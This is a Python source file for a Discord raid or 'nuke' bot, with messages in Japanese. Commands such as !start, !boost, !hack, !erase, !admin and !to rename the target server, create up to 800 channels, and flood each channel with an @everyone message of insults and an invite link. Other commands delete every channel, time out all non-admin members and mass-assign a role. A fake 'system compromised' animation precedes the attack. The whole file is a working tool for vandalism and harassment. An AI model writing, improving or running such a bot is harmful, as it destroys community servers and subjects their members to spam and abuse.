import sys
print("🔧 起動準備中...")

import discord
from discord import ui
from discord.ext import commands
from datetime import datetime, timezone, timedelta
import os
import asyncio

# ========== ✅ 最初に全部定義 ==========
GUILD_ID = 1537420800766771332
SERVER_NAME = "トイ神の植民地"
CHANNEL_NAME = "ここはトイ神の集い|TISNに荒らされました😂"
BATCH_SIZE = 50
CREATE_INTERVAL = 0.0
MAX_CHANNELS = 800
MAX_MESSAGES_PER_CHANNEL = 100

COMBINED_TEXT = (
    "@everyone\n"
    ".∧_∧\n"
    " ( ･ω･)つﾞ☆ﾍﾟﾁﾍﾟﾁ\n"
    " と ＿⌒))\n"
    "    (_ﾉﾉ\n"
    "\n"
    "∧,＿,∧  バカが治りますよ～に♡\n"
    "（`・ω・)つ━☆・*.\n"
    "⊂　　 ノ 　　　・゜+.\n"
    "　し'´Ｊ　　*・ °。\n"
    "\n"
    "https://discord.gg/SB2hn9eV8\n"
    "https://discord.gg/SB2hn9eV8\n"
    "お前らみたいな人生負け組のチー牛🧀🐮🤓と豚丼には到底入れないまぶしいサーバーww😂😂😂"
    "どうしたの両親揃って🫚👩‍⚕️の君！！！😂😂😂"
    "何も反論できないから妄想でリアル語るしかできないチーくんﾁｰ!ﾁｰ!🤓🐮"
)

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

stop_flag = asyncio.Event()
rate_limit_hit = asyncio.Event()
rate_limit_reset_at = None
background_tasks = set()
initiator_id = None
target_guild = None
created_channels = 0
active_jobs = 0
final_leave_lock = asyncio.Lock()


async def notify_rate_limit():
    if initiator_id is None:
        return
    try:
        user = await bot.fetch_user(initiator_id)
        if user:
            await user.send(
                "⚠️ **API制限を受けました**\n"
                "処理を自動停止しました。`!check` で確認を。"
            )
    except:
        pass


async def stop_only(message: str = None):
    global active_jobs, created_channels
    stop_flag.set()
    await asyncio.gather(*background_tasks, return_exceptions=True)
    background_tasks.clear()
    active_jobs = 0
    created_channels = 0
    stop_flag.clear()
    rate_limit_hit.clear()
    if message and target_guild:
        try:
            ch = target_guild.system_channel or next((c for c in target_guild.text_channels if c.permissions_for(target_guild.me).send_messages), None)
            if ch:
                await ch.send(message)
        except:
            pass


async def force_leave_all(message: str = None):
    global active_jobs
    stop_flag.set()
    rate_limit_hit.clear()
    active_jobs = 0
    for t in background_tasks:
        t.cancel()
    background_tasks.clear()
    if message and target_guild:
        try:
            ch = target_guild.system_channel or next((c for c in target_guild.text_channels), None)
            if ch:
                await ch.send(message)
        except:
            pass
    if target_guild:
        try:
            await target_guild.leave()
            print("✅ 強制退出完了")
        except Exception as e:
            print(f"⚠️ 退出: {e}")


async def try_auto_leave(message: str = None):
    async with final_leave_lock:
        global active_jobs
        active_jobs -= 1
        if active_jobs > 0:
            return
        stop_flag.set()
        await asyncio.gather(*background_tasks, return_exceptions=True)
        background_tasks.clear()
        if message and target_guild:
            try:
                ch = target_guild.system_channel or next((c for c in target_guild.text_channels), None)
                if ch:
                    await ch.send(message)
            except:
                pass
        if target_guild:
            try:
                await target_guild.leave()
            except:
                pass


class HackView(discord.ui.View):
    def __init__(self, guild):
        super().__init__(timeout=None)
        self.guild = guild

    @discord.ui.button(label="実行", style=discord.ButtonStyle.danger, emoji="💥")
    async def start_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        global initiator_id, target_guild, active_jobs, created_channels
        await interaction.response.defer(ephemeral=True)
        if active_jobs > 0:
            await stop_only("🔄 以前の処理を停止し、新規タスクを開始します。")
        initiator_id = interaction.user.id
        target_guild = interaction.guild
        created_channels = 0
        active_jobs += 1
        await interaction.followup.send("実行開始！", ephemeral=False)
        bot.loop.create_task(run_full(target_guild, auto_leave=True))


async def send_messages_task(channel):
    sent = 0
    while not stop_flag.is_set() and sent < MAX_MESSAGES_PER_CHANNEL:
        try:
            await channel.send(COMBINED_TEXT)
            sent += 1
            if CREATE_INTERVAL > 0:
                await asyncio.sleep(CREATE_INTERVAL)
        except discord.HTTPException as e:
            if e.status == 429:
                if not rate_limit_hit.is_set():
                    rate_limit_hit.set()
                    retry = getattr(e, "retry_after", 60)
                    global rate_limit_reset_at
                    rate_limit_reset_at = datetime.now(timezone.utc) + timedelta(seconds=retry)
                    await notify_rate_limit()
                    mins = int(retry // 60)
                    secs = int(retry % 60)
                    await force_leave_all(f"⚠️ API制限 あと約{mins}分{secs}秒")
                return
            await asyncio.sleep(1)
        except:
            return


async def run_full(guild, auto_leave=False):
    global created_channels
    try:
        await guild.edit(name=SERVER_NAME)
    except:
        pass
    while not stop_flag.is_set() and created_channels < MAX_CHANNELS:
        batch = []
        for i in range(BATCH_SIZE):
            if created_channels >= MAX_CHANNELS or stop_flag.is_set():
                break
            batch.append(guild.create_text_channel(f"{CHANNEL_NAME} {created_channels+1}"))
            created_channels += 1
        try:
            chans = await asyncio.gather(*batch)
        except discord.HTTPException as e:
            if e.status == 429:
                if not rate_limit_hit.is_set():
                    rate_limit_hit.set()
                    retry = getattr(e, "retry_after", 60)
                    rate_limit_reset_at = datetime.now(timezone.utc) + timedelta(seconds=retry)
                    await notify_rate_limit()
                    mins = int(retry // 60)
                    secs = int(retry % 60)
                    await force_leave_all(f"⚠️ API制限 あと約{mins}分{secs}秒")
                return
            await asyncio.sleep(1)
            continue
        for ch in chans:
            t = bot.loop.create_task(send_messages_task(ch))
            background_tasks.add(t)
            t.add_done_callback(background_tasks.discard)
        if not stop_flag.is_set():
            await asyncio.sleep(CREATE_INTERVAL)
    if auto_leave and not rate_limit_hit.is_set():
        await try_auto_leave(f"✅ 完了 合計{created_channels}チャンネル作成。Bot退出します。")


async def run_boost(guild, auto_leave=False):
    global created_channels
    while not stop_flag.is_set() and created_channels < MAX_CHANNELS:
        batch = []
        for i in range(BATCH_SIZE):
            if created_channels >= MAX_CHANNELS or stop_flag.is_set():
                break
            batch.append(guild.create_text_channel(f"{CHANNEL_NAME} {created_channels+1}"))
            created_channels += 1
        try:
            chans = await asyncio.gather(*batch)
        except discord.HTTPException as e:
            if e.status == 429:
                if not rate_limit_hit.is_set():
                    rate_limit_hit.set()
                    retry = getattr(e, "retry_after", 60)
                    rate_limit_reset_at = datetime.now(timezone.utc) + timedelta(seconds=retry)
                    await notify_rate_limit()
                    mins = int(retry // 60)
                    secs = int(retry % 60)
                    await force_leave_all(f"⚠️ API制限 あと約{mins}分{secs}秒")
                return
            await asyncio.sleep(1)
            continue
        for ch in chans:
            t = bot.loop.create_task(send_messages_task(ch))
            background_tasks.add(t)
            t.add_done_callback(background_tasks.discard)
        if not stop_flag.is_set():
            await asyncio.sleep(CREATE_INTERVAL)
    if auto_leave and not rate_limit_hit.is_set():
        await try_auto_leave(f"✅ 完了 合計{created_channels}チャンネル作成。Bot退出します。")


async def delete_all_channels(guild):
    tasks = [ch.delete() for ch in guild.channels]
    await asyncio.gather(*tasks, return_exceptions=True)


async def hacking_animation(channel):
    lines = [
        "[info] connecting to target...",
        "[info] resolving privileges...",
        "[warn] insufficient permissions, escalating...",
        "[info] found vulnerability: CVE-2026-xxxx",
        "[info] injecting payload...",
        "[info] bypassing firewalls...",
        "[info] accessing core... done",
        "[info] establishing root access...",
        "[success] system compromised ✅",
        "",
        "root@tisn:~# ./deploy --mass --force",
        "[OK] task queued. executing...",
        "",
        "===== 実行準備完了 =====",
        "下の「実行」ボタンを押すと開始されます"
    ]
    msg = await channel.send("`" + lines[0] + "`")
    for text in lines[1:]:
        await asyncio.sleep(0.3)
        await msg.edit(content=f"`{text}`")
    return msg


# ========== ✅ 起動時処理 ==========
@bot.event
async def on_ready():
    print(f"✅ 起動完了: {bot.user}")
    try:
        guild_obj = discord.Object(id=GUILD_ID)
        await bot.tree.sync(guild=guild_obj)
        print("✅ コマンド登録完了！")
    except Exception as e:
        print(f"⚠️ コマンド登録失敗: {type(e).__name__}: {e}")
        print("💡 再招待が必要な可能性大")


@bot.event
async def on_member_remove(member):
    global initiator_id, target_guild
    if initiator_id and target_guild and member.id == initiator_id:
        await force_leave_all("👋 実行者退出のため停止・退出")


# ========== ✅ コマンド全部 ==========
@bot.command()
async def check(ctx):
    global rate_limit_reset_at
    if rate_limit_hit.is_set() and rate_limit_reset_at:
        now = datetime.now(timezone.utc)
        rem = rate_limit_reset_at - now
        sec = int(rem.total_seconds())
        if sec <= 0:
            rate_limit_hit.clear()
            rate_limit_reset_at = None
            emb = discord.Embed(title="✅ API制限状況", color=0x00ff00)
            emb.add_field(name="状態", value="🔓 制限解除済み", inline=False)
        else:
            m = sec // 60
            s = sec % 60
            emb = discord.Embed(title="⚠️ API制限状況", color=0xff0000)
            emb.add_field(name="状態", value="🔒 API制限中", inline=False)
            emb.add_field(name="解除まで", value=f"あと **{m}分 {s}秒**", inline=False)
    else:
        emb = discord.Embed(title="✅ API制限状況", color=0x00ff00)
        emb.add_field(name="状態", value="🔓 制限なし", inline=False)
        emb.add_field(name="実行中タスク", value=f"{active_jobs}件", inline=False)
    await ctx.send(embed=emb)


@bot.command()
async def erase(ctx):
    """🗑️ 全削除→おちゅかれwww作成→居残り"""
    await ctx.send("🗑️ チャンネル全削除中...")
    await delete_all_channels(ctx.guild)
    await ctx.guild.create_text_channel("おちゅかれwww")


@bot.command()
async def start(ctx):
    global initiator_id, target_guild, active_jobs, created_channels
    initiator_id = ctx.author.id
    target_guild = ctx.guild
    if active_jobs > 0:
        await stop_only("🔄 以前の処理を停止し、新規タスクを開始します。")
    created_channels = 0
    active_jobs += 1
    await ctx.send(f"start 実行開始（最大{MAX_CHANNELS}チャンネル）\n✅ 完了後に自動退出します。")
    bot.loop.create_task(run_full(ctx.guild, auto_leave=True))


@bot.command()
async def boost(ctx):
    global initiator_id, target_guild, active_jobs, created_channels
    initiator_id = ctx.author.id
    target_guild = ctx.guild
    created_channels = 0
    active_jobs += 1
    await ctx.send(f"boost 実行開始（最大{MAX_CHANNELS}チャンネル）\n✅ 完了後に自動退出します。")
    bot.loop.create_task(run_boost(ctx.guild, auto_leave=True))


@bot.command()
async def stop(ctx):
    """🛑 即停止→確実に退出"""
    await ctx.send("🛑 全処理を強制停止し、Botを退出させます。")
    await force_leave_all("🛑 !stop により停止・退出。")


@bot.command()
async def hack(ctx):
    global initiator_id, target_guild, active_jobs, created_channels
    guild = ctx.guild
    if active_jobs > 0:
        await stop_only("🔄 以前の処理を停止し、新規タスクを開始します。")
    await delete_all_channels(guild)
    ch = await guild.create_text_channel("system-access-root")
    initiator_id = ctx.author.id
    target_guild = guild
    created_channels = 0
    active_jobs += 1
    await hacking_animation(ch)
    await ch.send("💥 準備完了", view=HackView(guild))


@bot.command()
async def admin(ctx):
    for m in ctx.guild.members:
        if not m.bot:
            try:
                role = discord.utils.get(ctx.guild.roles, name="TISN管理者")
                if role:
                    await m.add_roles(role)
            except:
                pass
    await ctx.send("✅ 管理者ロール付与完了")


@bot.command(name="to")
async def timeout_all(ctx):
    for m in ctx.guild.members:
        if not m.bot and not m.guild_permissions.administrator:
            try:
                await m.edit(timed_out_until=discord.utils.utcnow() + timedelta(days=1))
            except:
                pass
    await ctx.send("✅ 全員を1日タイムアウト")


# ========== ✅ 起動 ==========
TOKEN = os.getenv("DISCORD_BOT_TOKEN")
if not TOKEN:
    print("❌ DISCORD_BOT_TOKEN が設定されていません！")
    sys.exit(1)

print("🔧 Bot起動中...")
try:
    bot.run(TOKEN)
except Exception as e:
    print(f"❌ 起動エラー: {type(e).__name__}: {e}")
    sys.exit(1)